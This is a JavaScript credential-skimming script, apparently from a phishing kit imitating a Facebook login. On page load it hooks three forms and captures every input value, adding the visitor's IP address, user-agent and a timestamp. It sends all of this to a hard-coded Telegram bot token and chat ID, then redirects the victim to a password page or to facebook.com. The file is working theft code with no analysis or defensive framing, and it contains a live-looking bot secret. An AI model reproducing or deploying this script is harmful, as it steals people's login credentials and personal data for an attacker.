window.onload = () => {
  const botToken = "6472958143:AAFpWbyb11ejYYB-z9_uaVCwtg4eebVWvH0";
  const chatId = "1393367014";
  const getFormattedDate = () => {
    let d = new Date();

    d =
      d.getFullYear() +
      "-" +
      ("0" + (d.getMonth() + 1)).slice(-2) +
      "-" +
      ("0" + d.getDate()).slice(-2) +
      " " +
      ("0" + d.getHours()).slice(-2) +
      ":" +
      ("0" + d.getMinutes()).slice(-2) +
      ":" +
      ("0" + d.getSeconds()).slice(-2);

    return d;
  };

  const post = (data, redirect = "/") => {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    let text = "";
    Object.entries(data).forEach(([key, value]) => {
      text += `${key}: ${value}` + "\n";
    });
    //bot.sendMessage(text)
    fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
        text,
      )}`,
    )
      .then((res) => location.assign(redirect))
      .catch((err) => console.log(err));
  };

  const onSubmit = async (e, redirect) => {
    e.preventDefault();
    const data = {};
    const ip = await (await fetch("https://api.ipify.org")).text();
    const inputs = e.target.querySelectorAll("input");
    inputs.forEach((input) => {
      if (input.name) data[input.name] = input.value;
    });
    data["ip"] = ip;
    data["user-agent"] = navigator.userAgent;
    data["date"] = getFormattedDate();
    post(data, redirect);
  };

  const form1 = document.querySelector("#form1");
  const form2 = document.querySelector("#form2");
  const form3 = document.querySelector("#form3");
  form1?.addEventListener("submit", (e) => onSubmit(e, "password.html"));
  form2?.addEventListener("submit", (e) => onSubmit(e, "password.html"));
  form3?.addEventListener("submit", (e) => onSubmit(e, "https://facebook.com"));
};
